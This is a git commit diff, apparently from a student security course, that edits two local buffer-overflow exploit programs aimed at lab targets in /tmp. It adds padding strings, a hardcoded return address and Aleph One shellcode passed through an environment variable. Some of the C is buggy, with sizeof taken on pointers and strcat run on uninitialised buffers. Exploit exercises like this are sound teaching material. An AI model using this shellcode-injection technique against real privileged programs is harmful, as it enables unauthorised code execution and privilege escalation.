0f992f0097ceb1c3c509d0fa9932c6edfbec988a
Adam Levin <awl44@me.com>
2019-11-29 16:57:54 -0800

    struggles

--- sploits/sploit2.c
+++ sploits/sploit2.c
@@ -7,14 +7,38 @@
 
 #define TARGET "/tmp/target2"
 
+char *repeat(char *s, int x)
+{
+  //from https://stackoverflow.com/a/22599676/5552894
+  char *result = malloc(sizeof(s) * x + 1);
+  while (x > 0) {
+      strcat(result, s);
+      x --;
+  }
+  return result;
+}
+
 int main(void)
 {
-  char *args[3]; 
+  char *args[4]; 
   char *env[1];
+
+  char *noop = "A";
+  int sled_length = 300;
+  char *result = malloc(sizeof(noop)*sled_length + 2);
+  char *result1 = repeat(noop, sled_length);
+  strcat(result, result1);
+  strcat(result, "\x00");
+
+  char *preface = "shellcode=";
+  char *envvar = malloc(sizeof(preface)+sizeof(shellcodeAlephOne)+1);
+  strcat(envvar, preface);
+  strcat(envvar, shellcodeAlephOne);
   
   args[0] = TARGET;
-  args[1] = "student"; 
-  args[2] = NULL;
+  args[1] = result;
+  args[2] = "399";
+  args[3] = NULL;
   
   env[0] = NULL;
   execve(TARGET, args, env);
--- sploits/sploit3.c
+++ sploits/sploit3.c
@@ -11,12 +11,21 @@ int main(void)
 {
   char *args[3]; 
   char *env[1];
-  
+
+   //bfffffa1
+  char *address = "\xa1\xff\xff\xbf";
+  char *result = malloc(sizeof(address) + 1);
+  strcat(result, address);
+
+  char *preface = "shellcode=";
+  char *envvar = malloc(sizeof(preface)+sizeof(shellcodeAlephOne)+1);
+  strcat(envvar, preface);
+  strcat(envvar, shellcodeAlephOne);
   args[0] = TARGET;
-  args[1] = "student"; 
+  args[1] = result;
   args[2] = NULL;
   
-  env[0] = NULL;
+  env[0] = envvar;
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
 
